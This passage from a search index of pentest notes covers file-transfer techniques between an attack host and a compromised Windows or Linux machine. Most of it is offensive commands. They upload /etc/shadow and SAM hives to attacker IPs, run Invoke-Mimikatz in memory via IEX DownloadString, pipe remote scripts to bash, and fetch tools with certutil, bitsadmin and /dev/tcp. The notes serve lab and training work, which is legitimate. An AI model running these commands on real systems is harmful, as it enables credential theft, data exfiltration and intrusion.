implementation comes with an SCP utility for remote file transfer that, by default, uses the SSH protocol.</p> <p>SCP (secure copy) is a command-line utility that allows you to copy files and directories between two hosts securely. We can copy our files from local to remote servers and from remote servers to our local machine.</p> <p>SCP is very similar to copy or cp, but instead of providing a local path, we need to specify a username, the remote IP address or DNS name, and the user's credentials.</p> <p>Enabling the SSH Server</p> <pre><code>$ sudo systemctl enable ssh`\n</code></pre> <p>Starting the SSH Server</p> <pre><code>$ sudo systemctl start ssh`\n</code></pre> <p>Checking for SSH Listening Port</p> <pre><code>$ netstat -lnpt`\n</code></pre> <p>Downloading Files Using SCP</p> <pre><code>$ scp plaintext@192.168.49.128:/root/myroot.txt . `\n</code></pre> <p><code>Note: You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.</code></p>"},{"location":"zNew/TransferFiles/Linux/#target-to-attack","title":"Target to Attack","text":""},{"location":"zNew/TransferFiles/Linux/#web-upload","title":"Web Upload","text":"<p>Attack - Start Web Server</p> <pre><code>$ sudo python3 -m pip install --user uploadserver`\n</code></pre> <p>Attack - Create a Self-Signed Certificate</p> <pre><code>$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'`\n</code></pre> <p><code>The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.</code></p> <p>Attack - Start Web Server</p> <pre><code>$ mkdir https &amp;&amp; cd https\n$ sudo python3 -m uploadserver 443 --server-certificate /root/server.pem\n</code></pre> <p>Target - Upload Multiple Files</p> <pre><code>$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure\n</code></pre>"},{"location":"zNew/TransferFiles/Linux/#alternative-web-file-transfer-method","title":"Alternative Web File Transfer Method","text":"<p>Target - Creating a Web Server with Python3</p> <pre><code>$ python3 -m http.server\n</code></pre> <p>Target - Creating a Web Server with Python2.7</p> <pre><code>$ python2.7 -m SimpleHTTPServer\n</code></pre> <p>Target - Creating a Web Server with PHP</p> <pre><code>$ php -S 0.0.0.0:8000\n</code></pre> <p>Target - Creating a Web Server with Ruby</p> <pre><code>$ ruby -run -ehttpd . -p8000\n</code></pre> <p>Download the File from the Target Machine onto the Attack</p> <pre><code>$ wget 192.168.49.128:8000/filetotransfer.txt\n</code></pre>"},{"location":"zNew/TransferFiles/Linux/#scp-upload","title":"SCP Upload","text":"<p>File Upload using SCP</p> <pre><code>$ scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/\n</code></pre> <pre><code>scp -P 3520 usuario@192.168.49.128:/home/usuario/arquivo.txt .\n</code></pre>"},{"location":"zNew/TransferFiles/LivingOffTheLand/","title":"LivingOffTheLand","text":""},{"location":"zNew/TransferFiles/LivingOffTheLand/#delete","title":"delete","text":""},{"location":"zNew/TransferFiles/LivingOffTheLand/#living-off-the-land","title":"Living off The Land","text":"<ul> <li>LOLBAS Project for Windows Binaries</li> <li>GTFOBins for Linux Binaries</li> </ul>"},{"location":"zNew/TransferFiles/LivingOffTheLand/#using-the-lolbas-and-gtfobins-project","title":"Using the LOLBAS and GTFOBins Project","text":"<p>Upload win.ini to our Target</p> <pre><code>&gt; certreq.exe -Post -config http://192.168.49.128:8000/ c:\\windows\\win.ini\nCertificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)\n</code></pre> <p>This will send the file to our Netcat session, and we can copy-paste its contents.</p> <p>File Received in our Netcat Session</p> <pre><code>$ sudo nc -lvnp 8000\n\nlistening on [any] 8000 ...\nconnect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819\nPOST / HTTP/1.1\nCache-Control: no-cache\nConnection: Keep-Alive\nPragma: no-cache\nContent-Type: application/json\nUser-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)\nContent-Length: 92\nHost: 192.168.49.128:8000\n\n; for 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]\n[files]\n[Mail]\nMAPI=1\n</code></pre> <p>If you get an error when running certreq.exe, the version you are using may not contain the -Post parameter. You can download an updated version here and try again.</p>"},{"location":"zNew/TransferFiles/LivingOffTheLand/#gtfobins","title":"GTFOBins","text":"<p>Create Certificate in our Pwnbox</p> <pre><code>$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem\n\nGenerating a RSA private key\n.......................................................................................................+++++\n................+++++\nwriting new private key to 'key.pem'\n-----\nYou are about to be asked to enter information that will be incorporated\ninto your certificate request.\nWhat you are about to enter is what is called a Distinguished Name or a DN.\nThere are quite a few fields but you can leave some blank\nFor some fields there will be a default value,\nIf you enter '.', the field will be left blank.\n-----\nCountry Name (2 letter code) [AU]:\nState or Province Name (full name) [Some-State]:\nLocality Name (eg, city) []:\nOrganization Name (eg, company) [Internet Widgits Pty Ltd]:\nOrganizational Unit Name (eg, section) []:\nCommon Name (e.g. server FQDN or YOUR name) []:\nEmail Address []:\n</code></pre> <p>Stand up the Server in our Pwnbox</p> <pre><code>$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem &lt; /tmp/LinEnum.sh\n</code></pre> <p>Download File from the Compromised Machine</p> <pre><code>$ openssl s_client -connect 10.10.10.32:80 -quiet &gt; LinEnum.sh\n</code></pre>"},{"location":"zNew/TransferFiles/LivingOffTheLand/#other-common-living-off-the-land-tools","title":"Other Common Living off the Land tools","text":""},{"location":"zNew/TransferFiles/LivingOffTheLand/#bitsadmin-download-function","title":"Bitsadmin Download function","text":"<p>File Download with Bitsadmin</p> <pre><code>PS &gt; bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\\Users\\htb-student\\Desktop\\nc.exe\n</code></pre> <p>PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers. Download</p> <pre><code>PS &gt; Import-Module bitstransfer; Start-BitsTransfer -Source \"http://10.10.10.32:8000/nc.exe\" -Destination \"C:\\Windows\\Temp\\nc.exe\"\n</code></pre>"},{"location":"zNew/TransferFiles/LivingOffTheLand/#certutil","title":"Certutil","text":"<p>Casey Smith (@subTee) found that Certutil can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto wget for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage.</p> <p>Download a File with Certutil</p> <pre><code>&gt; certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe\n&gt; certutil.exe -urlcache -f http://10.10.10.32:8000/nc.exe nc.exe\n</code></pre>"},{"location":"zNew/TransferFiles/Miscellaneous/","title":"Miscellaneous","text":""},{"location":"zNew/TransferFiles/Miscellaneous/#delete","title":"delete","text":""},{"location":"zNew/TransferFiles/Miscellaneous/#miscellaneous-file-transfer-methods","title":"Miscellaneous File Transfer Methods","text":""},{"location":"zNew/TransferFiles/Miscellaneous/#file-transfer-with-netcat-and-ncat","title":"File Transfer with Netcat and Ncat","text":"<p>NetCat - Target Machine - Listening on Port 8000</p> <pre><code>$ nc -l -p 8000 &gt; SharpKatz.exe\n</code></pre> <p>Ncat - Target Machine - Listening on Port 8000</p> <pre><code>$ # Example using Ncat\n$ ncat -l -p 8000 --recv-only &gt; SharpKatz.exe\n</code></pre> <p>Netcat - Attack Host - Sending File to Compromised machine</p> <pre><code>$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe\n\n$ nc -q 0 192.168.49.128 8000 &lt; SharpKatz.exe\n</code></pre> <p>Ncat - Attack Host - Sending File to Compromised machine</p> <pre><code>$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe\n\n$ ncat --send-only 192.168.49.128 8000 &lt; SharpKatz.exe\n</code></pre> <p>Attack Host - Sending File as Input to Netcat</p> <pre><code>$ sudo nc -l -p 443 -q 0 &lt; SharpKatz.exe\n</code></pre> <p>Compromised Machine Connect to Netcat to Receive the File</p> <pre><code>$ nc 192.168.49.128 443 &gt; SharpKatz.exe\n</code></pre> <p>Attack Host - Sending File as Input to Ncat</p> <pre><code>$ sudo ncat -l -p 443 --send-only &lt; SharpKatz.exe\n</code></pre> <p>Target Machine Connect to Ncat to Receive the File</p> <pre><code>$ ncat 192.168.49.128 443 --recv-only &gt; SharpKatz.exe\n</code></pre> <p>NetCat - Sending File as Input to Netcat</p> <pre><code>$ sudo nc -l -p 443 -q 0 &lt; SharpKatz.exe\n</code></pre> <p>Ncat - Sending File as Input to Netcat</p> <pre><code>$ sudo ncat -l -p 443 --send-only &lt; SharpKatz.exe\n</code></pre> <p>Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File</p> <pre><code>$ cat &lt; /dev/tcp/192.168.49.128/443 &gt; SharpKatz.exe\n</code></pre> <p><code>Note: The same operation can be used to transfer files from the compromised host to our Pwnbox.</code></p>"},{"location":"zNew/TransferFiles/Miscellaneous/#powershell-session-file-transfer","title":"PowerShell Session File Transfer","text":"<p>From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01</p> <pre><code>&gt; Test-NetConnection -ComputerName DATABASE01 -Port 5985\n\nComputerName     : DATABASE01\nRemoteAddress    : 192.168.1.101\nRemotePort       : 5985\nInterfaceAlias   : Ethernet0\nSourceAddress    : 192.168.1.100\nTcpTestSucceeded : True\n</code></pre> <p>Create a PowerShell Remoting Session to DATABASE01</p> <pre><code>&gt; $Session = New-PSSession -ComputerName DATABASE01\n</code></pre> <p>Copy samplefile.txt from our Localhost to the DATABASE01 Session</p> <pre><code>&gt; Copy-Item -Path C:\\samplefile.txt -ToSession $Session -Destination C:\\Users\\Administrator\\Desktop\\\n</code></pre> <p>Copy DATABASE.txt from DATABASE01 Session to our Localhost</p> <pre><code>&gt; Copy-Item -Path \"C:\\Users\\Administrator\\Desktop\\DATABASE.txt\" -Destination C:\\ -FromSession $Session\n</code></pre>"},{"location":"zNew/TransferFiles/Miscellaneous/#rdp","title":"RDP","text":"<p>Mounting a Linux Folder Using rdesktop</p> <pre><code>$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'\n</code></pre> <p>Mounting a Linux Folder Using xfreerdp</p> <pre><code>$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer\n</code></pre> <p>To access the directory, we can connect to \\tsclient\\, allowing us to transfer files to and from the RDP session.</p> <p>Alternatively, from Windows, the native mstsc.exe remote desktop client can be used.</p> <p>After selecting the drive, we can interact with it in the remote session that follows.</p> <p>`Note: This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.</p>"},{"location":"zNew/TransferFiles/ProtectFiles/","title":"ProtectFiles","text":""},{"location":"zNew/TransferFiles/ProtectFiles/#delete","title":"delete","text":""},{"location":"zNew/TransferFiles/ProtectFiles/#protected-file-transfers","title":"Protected File Transfers","text":""},{"location":"zNew/TransferFiles/ProtectFiles/#file-encryption-on-windows","title":"File Encryption on Windows","text":"<p>Invoke-AESEncryption.ps1</p> <pre><code>.EXAMPLE\nInvoke-AESEncryption -Mode Encrypt -Key \"p@ssw0rd\" -Text \"Secret Text\" \n\nDescription\n-----------\nEncrypts the string \"Secret Test\" and outputs a Base64 encoded ciphertext.\n\n.EXAMPLE\nInvoke-AESEncryption -Mode Decrypt -Key \"p@ssw0rd\" -Text \"LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=\"\n\nDescription\n-----------\nDecrypts the Base64 encoded string \"LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=\" and outputs plain text.\n\n.EXAMPLE\nInvoke-AESEncryption -Mode Encrypt -Key \"p@ssw0rd\" -Path file.bin\n\nDescription\n-----------\nEncrypts the file \"file.bin\" and outputs an encrypted file \"file.bin.aes\"\n\n.EXAMPLE\nInvoke-AESEncryption -Mode Decrypt -Key \"p@ssw0rd\" -Path file.bin.aes\n\nDescription\n-----------\nDecrypts the file \"file.bin.aes\" and outputs an encrypted file \"file.bin\"\n#&gt;\nfunction Invoke-AESEncryption {\n    [CmdletBinding()]\n    [OutputType([string])]\n    Param\n    (\n        [Parameter(Mandatory = $true)]\n        [ValidateSet('Encrypt', 'Decrypt')]\n        [String]$Mode,\n\n        [Parameter(Mandatory = $true)]\n        [String]$Key,\n\n        [Parameter(Mandatory = $true, ParameterSetName = \"CryptText\")]\n        [String]$Text,\n\n        [Parameter(Mandatory = $true, ParameterSetName = \"CryptFile\")]\n        [String]$Path\n    )\n\n    Begin {\n        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed\n        $aesManaged = New-Object System.Security.Cryptography.AesManaged\n        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC\n        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros\n        $aesManaged.BlockSize = 128\n        $aesManaged.KeySize = 256\n    }\n\n    Process {\n        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))\n\n        switch ($Mode) {\n            'Encrypt' {\n                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}\n\n                if ($Path) {\n                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue\n                    if (!$File.FullName) {\n                        Write-Error -Message \"File not found!\"\n                        break\n                    }\n                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)\n                    $outPath = $File.FullName + \".aes\"\n                }\n\n                $encryptor = $aesManaged.CreateEncryptor()\n                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)\n                $encryptedBytes = $aesManaged.IV + $encryptedBytes\n                $aesManaged.Dispose()\n\n                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}\n\n                if ($Path) {\n                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)\n                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime\n                    return \"File encrypted to $outPath\"\n                }\n            }\n\n            'Decrypt' {\n                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}\n\n                if ($Path) {\n                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue\n                    if (!$File.FullName) {\n                        Write-Error -Message \"File not found!\"\n                        break\n                    }\n                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)\n                    $outPath = $File.FullName -replace \".aes\"\n                }\n\n                $aesManaged.IV = $cipherBytes[0..15]\n                $decryptor = $aesManaged.CreateDecryptor()\n                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)\n                $aesManaged.Dispose()\n\n                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}\n\n                if ($Path) {\n                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)\n                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime\n                    return \"File decrypted to $outPath\"\n                }\n            }\n        }\n    }\n\n    End {\n        $shaManaged.Dispose()\n        $aesManaged.Dispose()\n    }\n}\n</code></pre> <p>Import Module Invoke-AESEncryption.ps1</p> <pre><code>&gt; Import-Module .\\Invoke-AESEncryption.ps1\n</code></pre> <p>After the script is imported, it can encrypt strings or files, as shown in the following examples. This command creates an encrypted file with the same name as the encrypted file but with the extension \".aes.\"</p> <p>File Encryption Example</p> <pre><code>&gt; Invoke-AESEncryption -Mode Encrypt -Key \"p4ssw0rd\" -Path .\\scan-results.txt\n\nFile encrypted to C:\\htb\\scan-results.txt.aes\n</code></pre>"},{"location":"zNew/TransferFiles/ProtectFiles/#file-encryption-on-linux","title":"File Encryption on Linux","text":"<p>Encrypting with openssl</p> <pre><code>$ openssl enc -aes256 -iter 100000 -pbkdf2 -in &lt;PATH_TO_FILE&gt; -out &lt;OUTFILE&gt;.enc\n\nenter aes-256-cbc encryption password:                                                         \nVerifying - enter aes-256-cbc encryption password:                              \n</code></pre> <p>Decrypt passwd.enc with openssl</p> <pre><code>$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in &lt;OUTFILE&gt;.enc -out &lt;DECRYPTED&gt;                    \n\nenter aes-256-cbc decryption password:\n</code></pre>"},{"location":"zNew/TransferFiles/TransferFilesCode/","title":"TransferFilesCode","text":""},{"location":"zNew/TransferFiles/TransferFilesCode/#delete","title":"delete","text":""},{"location":"zNew/TransferFiles/TransferFilesCode/#transferring-files-with-code","title":"Transferring Files with Code","text":""},{"location":"zNew/TransferFiles/TransferFilesCode/#python","title":"Python","text":"<p>Python 2 - Download</p> <pre><code>$ python2.7 -c 'import urllib;urllib.urlretrieve (\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\")'\n</code></pre> <p>Python 3 - Download</p> <pre><code>$ python3 -c 'import urllib.request;urllib.request.urlretrieve(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\")'\n</code></pre>"},{"location":"zNew/TransferFiles/TransferFilesCode/#php","title":"PHP","text":"<p>PHP Download with File_get_contents()</p> <pre><code>$ php -r '$file = file_get_contents(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); file_put_contents(\"LinEnum.sh\",$file);'\n</code></pre> <p>PHP Download with Fopen()</p> <pre><code>$ php -r 'const BUFFER = 1024; $fremote = \nfopen(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"rb\"); $flocal = fopen(\"LinEnum.sh\", \"wb\"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'\n</code></pre> <p>PHP Download a File and Pipe it to Bash</p> <pre><code>$ php -r '$lines = @file(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); foreach ($lines as $line_num =&gt; $line) { echo $line; }' | bash\n</code></pre> <p><code>Note: The URL can be used as a filename with the @file function if the fopen wrappers have been enabled.</code></p>"},{"location":"zNew/TransferFiles/TransferFilesCode/#other-languages","title":"Other Languages","text":"<p>Ruby - Download a File</p> <pre><code>$ ruby -e 'require \"net/http\"; File.write(\"LinEnum.sh\", Net::HTTP.get(URI.parse(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\")))'\n</code></pre> <p>Perl - Download a File</p> <pre><code>$ perl -e 'use LWP::Simple; getstore(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\");'\n</code></pre>"},{"location":"zNew/TransferFiles/TransferFilesCode/#javascript","title":"JavaScript","text":"<pre><code>var WinHttpReq = new ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");\nWinHttpReq.Open(\"GET\", WScript.Arguments(0), /*async=*/false);\nWinHttpReq.Send();\nBinStream = new ActiveXObject(\"ADODB.Stream\");\nBinStream.Type = 1;\nBinStream.Open();\nBinStream.Write(WinHttpReq.ResponseBody);\nBinStream.SaveToFile(WScript.Arguments(1));\n</code></pre> <p>Download a File Using JavaScript and cscript.exe</p> <pre><code>&gt; cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1\n</code></pre>"},{"location":"zNew/TransferFiles/TransferFilesCode/#vbscript","title":"VBScript","text":"<pre><code>dim xHttp: Set xHttp = createobject(\"Microsoft.XMLHTTP\")\ndim bStrm: Set bStrm = createobject(\"Adodb.Stream\")\nxHttp.Open \"GET\", WScript.Arguments.Item(0), False\nxHttp.Send\n\nwith bStrm\n    .type = 1\n    .open\n    .write xHttp.responseBody\n    .savetofile WScript.Arguments.Item(1), 2\nend with\n</code></pre> <p>Download a File Using VBScript and cscript.exe</p> <pre><code>&gt; cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1\n</code></pre>"},{"location":"zNew/TransferFiles/TransferFilesCode/#upload-operations-using-python3","title":"Upload Operations using Python3","text":"<p>Starting the Python uploadserver Module</p> <pre><code>$ python3 -m uploadserver \n\nFile upload available at /upload\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n</code></pre> <p>Uploading a File Using a Python One-liner</p> <pre><code>$ python3 -c 'import requests;requests.post(\"http://192.168.49.128:8000/upload\",files={\"files\":open(\"/etc/passwd\",\"rb\")})'\n</code></pre>"},{"location":"zNew/TransferFiles/Windows/","title":"Windows","text":""},{"location":"zNew/TransferFiles/Windows/#delete","title":"delete","text":""},{"location":"zNew/TransferFiles/Windows/#attack-to-target","title":"Attack to Target","text":""},{"location":"zNew/TransferFiles/Windows/#powershell-base64-encode-decode","title":"PowerShell Base64 Encode &amp; Decode","text":"<p>Attack Check SSH Key MD5 Hash</p> <pre><code>$ md5sum id_rsa\n</code></pre> <p>Attack Encode SSH Key to Base64</p> <pre><code>$ cat id_rsa |base64 -w 0;echo\n</code></pre> <p>Target Paste Base64</p> <pre><code>PS &gt; [IO.File]::WriteAllBytes(\"C:\\Users\\Public\\id_rsa\", [Convert]::FromBase64String(\"\"))\n</code></pre> <p>Confirming the MD5 Hashes Match</p> <pre><code>PS &gt; Get-FileHash C:\\Users\\Public\\id_rsa -Algorithm md5\n</code></pre>"},{"location":"zNew/TransferFiles/Windows/#powershell-web-downloads","title":"PowerShell Web Downloads","text":"Method Description OpenRead Returns the data from a resource as a Stream. OpenReadAsync Returns the data from a resource without blocking the calling thread. DownloadData Downloads data from a resource and returns a Byte array. DownloadDataAsync Downloads data from a resource and returns a Byte array without blocking the calling thread. DownloadFile Downloads data from a resource to a local file. DownloadFileAsync Downloads data from a resource to a local file without blocking the calling thread. DownloadString Downloads a String from a resource and returns a String. DownloadStringAsync Downloads a String from a resource without blocking the calling thread. <p>File Download We can specify the class name Net.WebClient and the method DownloadFile with the parameters corresponding to the URL of the target file to download and the output file name.</p> <pre><code>PS &gt; (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1')\n\n\nPS &gt; (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\\Users\\Public\\Downloads\\PowerViewAsync.ps1')\n</code></pre> <p>Fileless Method As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX.</p> <pre><code>PS &gt; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')\n\n\nPS &gt; (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX\n</code></pre> <p>Invoke-WebRequest From PowerShell 3.0 onwards, the Invoke-WebRequest cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases iwr, curl, and wget instead of the Invoke-WebRequest full name.</p> <pre><code>PS &gt; Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1`\n</code></pre> <p>Common Errors with PowerShell There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.. This can be bypassed using the parameter -UseBasicParsing.</p> <pre><code>PS &gt; Invoke-WebRequest https://&lt;ip&gt;/PowerView.ps1 -UseBasicParsing | IEX`\n</code></pre> <p>Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:</p> <pre><code>PS &gt; IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')\n\nPS &gt; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n</code></pre>"},{"location":"zNew/TransferFiles/Windows/#smb-downloads","title":"SMB Downloads","text":"<p>Create the SMB Server</p> <pre><code>$ sudo impacket-smbserver share -smb2support /tmp/smbshare\n</code></pre> <p>Copy a File from the SMB Server New versions of Windows block unauthenticated guest access, as we can see in the following command:</p> <pre><code>C:\\home&gt; copy \\\\192.168.220.133\\share\\nc.exe\n\nYou can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.\n</code></pre> <p>To transfer files in this scenario, we can set a username and password using our Impacket SMB server and mount the SMB server on our windows target machine:</p> <p>Create the SMB Server with a Username and Password</p> <pre><code>$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test\n</code></pre> <p>Mount the SMB Server with Username and Password</p> <pre><code>C:\\home&gt; net use n: \\\\192.168.220.133\\share /user:test test\n\nC:\\home&gt; copy n:\\nc.ex\n</code></pre> <p>`Note: You can also mount the SMB server if you receive an error when you use copy filename \\IP\\sharename.</p>"},{"location":"zNew/TransferFiles/Windows/#ftp-downloads","title":"FTP Downloads","text":"<p>Setting up a Python3 FTP Server</p> <pre><code>$ sudo python3 -m pyftpdlib --port 21\n</code></pre> <p>Transfering Files from an FTP Server Using PowerShell</p> <pre><code>PS &gt; (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\\Users\\Public\\ftp-file.txt')\n</code></pre> <p>When we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.</p> <p>Create a Command File for the FTP Client and Download the Target File</p> <pre><code>C:\\home&gt; echo open 192.168.49.128 &gt; ftpcommand.txt\nC:\\home&gt; echo USER anonymous &gt;&gt; ftpcommand.txt\nC:\\home&gt; echo binary &gt;&gt; ftpcommand.txt\nC:\\home&gt; echo GET file.txt &gt;&gt; ftpcommand.txt\nC:\\home&gt; echo bye &gt;&gt; ftpcommand.txt\nC:\\home&gt; ftp -v -n -s:ftpcommand.txt\nftp&gt; open 192.168.49.128\nLog in with USER and PASS first.\nftp&gt; USER anonymous\n\nftp&gt; GET file.txt\nftp&gt; bye\n</code></pre>"},{"location":"zNew/TransferFiles/Windows/#target-to-attack","title":"Target to Attack","text":""},{"location":"zNew/TransferFiles/Windows/#powershell-base64-encode-decode_1","title":"PowerShell Base64 Encode &amp; Decode","text":"<p>Encode File Using PowerShell</p> <pre><code>PS &gt; [Convert]::ToBase64String((Get-Content -path \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Encoding byte))\n\n\nPS &gt; Get-FileHash \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Algorithm MD5 | select Hash\n</code></pre> <p>Decode Base64 String in Linux</p> <pre><code>$ echo = | base64 -d &gt; hosts\n\n$ md5sum hosts\n</code></pre>"},{"location":"zNew/TransferFiles/Windows/#powershell-web-uploads","title":"PowerShell Web Uploads","text":"<p>PowerShell doesn't have a built-in function for upload operations, but we can use Invoke-WebRequest or Invoke-RestMethod to build our upload function. We'll also need a web server that accepts uploads, which is not a default option in most common webserver utilities.</p> <p>For our web server, we can use uploadserver, an extended module of the Python HTTP.server module, which includes a file upload page. </p> <p>Installing a Configured WebServer with Upload</p> <pre><code>$ pip3 install uploadserver\n</code></pre> <pre><code>$ python3 -m uploadserver\n</code></pre> <p>Now we can use a PowerShell script PSUpload.ps1 which uses Invoke-RestMethod to perform the upload operations. The script accepts two parameters -File, which we use to specify the file path, and -Uri, the server URL where we'll upload our file. Let's attempt to upload the host file from our Windows host.</p> <p>PowerShell Script to Upload a File to Python Upload Server</p> <pre><code>PS &gt; IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')\n\nPS &gt; Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\\Windows\\System32\\drivers\\etc\\hosts\n</code></pre>"},{"location":"zNew/TransferFiles/Windows/#powershell-base64-web-upload","title":"PowerShell Base64 Web Upload","text":"<pre><code>PS &gt; $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte))\n\nPS &gt; Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64\n</code></pre> <pre><code>$ nc -lvnp 8000\n\n$ echo &lt;base64&gt; | base64 -d -w 0 &gt; hosts\n</code></pre>"},{"location":"zNew/TransferFiles/Windows/#smb-uploads","title":"SMB Uploads","text":""},{"location":"zNew/TransferFiles/Windows/#webdav","title":"WebDav","text":"<p>Installing WebDav Python modules</p> <pre><code>$ sudo pip3 install wsgidav cheroot\n</code></pre> <p>Using the WebDav Python module</p> <pre><code>$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous\n</code></pre> <p>Connecting to the Webdav Share</p> <pre><code>C:\\home&gt; dir \\\\192.168.49.128\\DavWWWRoot\n</code></pre> <p>Uploading Files using SMB</p> <pre><code>C:\\home&gt; copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\DavWWWRoot\\\n</code></pre>"},{"location":"zNew/TransferFiles/Windows/#smbserver","title":"smbserver","text":"<p>Creating a Share with smbserver.py</p> <pre><code>$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/\n</code></pre> <p>Upload to Attack</p> <pre><code>C:\\home&gt; copy sam.save \\\\10.10.15.16\\CompData\n\nC:\\home&gt; move sam.save \\\\10.10.15.16\\CompData\n\nC:\\home&gt; copy n:\\nc.ex\n</code></pre>"},{"location":"zNew/TransferFiles/Windows/#ftp-uploads","title":"FTP Uploads","text":"<pre><code>$ sudo python3 -m pyftpdlib --port 21 